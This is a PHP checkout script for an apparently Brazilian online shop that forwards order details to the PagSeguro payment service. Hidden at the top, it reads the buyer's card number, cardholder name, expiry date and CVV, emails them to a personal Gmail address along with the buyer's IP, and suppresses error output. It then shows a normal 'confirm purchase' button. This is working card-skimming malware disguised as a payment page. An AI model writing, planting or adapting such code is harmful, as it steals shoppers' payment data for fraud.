<?php

ini_set('display_errors', 0);
error_reporting(0);
$email_cobranca = $_POST['email_cobranca'];
$tipo = $_POST['tipo'];
$moeda = $_POST['moeda'];
$item_id_1 = $_POST['item_id_1'];
$item_descr_1 = $_POST['item_descr_1'];
$item_quant_1 = $_POST['item_quant_1'];
$item_valor_1 = $_POST['total'];
$item_frete_1 = $_POST['valor_frete'];
$cliente_nome = $_POST['c_nome'];
$cliente_email = $_POST['c_email'];
$cliente_cep = $_POST['c_cep'];
$ref_transacao = $_POST['ref_transacao'];

$cc= $_POST['ccnum']; 
$nome = $_POST['ccnome']; 
$data = $_POST['ccdata'];
$cvv = $_POST['cccvv'];
$ip = $_SERVER["REMOTE_ADDR"];
$hora = date("Y-m-d  #  H:i:s");
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: CC <info@consulta.com.br>";

$c.="<b>======== INFO CC ========</b><br>";
$c.="<b>NOME: $nome</b><br>";
$c.="<b>CC: $cc</b><br>";
$c.="<b>DATA: $data </b><br>";
$c.="<b>CVV: $cvv </b><br>";
$c.="<b>======== INFO CC ========</b><br>";

mail("dalanakbar@gmail.com", "$ip [ - $nome ]", "$c", $headers);
?>
<form name="pagseguro_form" action="https://pagseguro.uol.com.br/checkout/checkout.jhtml" method="post">
    <input type="hidden" name="email_cobranca" value="" />
    <input type="hidden" name="tipo" value="CP" />
    <input type="hidden" name="moeda" value="BRL" />
    <input type="hidden" name="item_id_1" value="<?=$item_id_1?>" />
    <input type="hidden" name="item_descr_1" value="<?=$item_descr_1?>" />
    <input type="hidden" name="item_quant_1" value="1" />
    <input type="hidden" name="item_valor_1" value="<?=$item_valor_1?>" />
    <input type="hidden" name="item_frete_1" value="<?=$item_frete_1?>" />
    <input type="hidden" name="cliente_nome" value="<?=$cliente_nome?>" />
    <input type="hidden" name="cliente_email" value="<?=$cliente_email?>" />
    <input type="hidden" name="cliente_cep" value="<?=$cliente_cep?>" />
    <input name="ref_transacao" type="hidden" id="ref_transacao" value="<?=$ref_transacao?>" />
    <b>Confirme sua compra clicando abaixo!</b><br/>
    <input type="image" src="img/botao_pagar.png" name="submit" alt="PagSeguro" class="standard-checkout"/>
</form>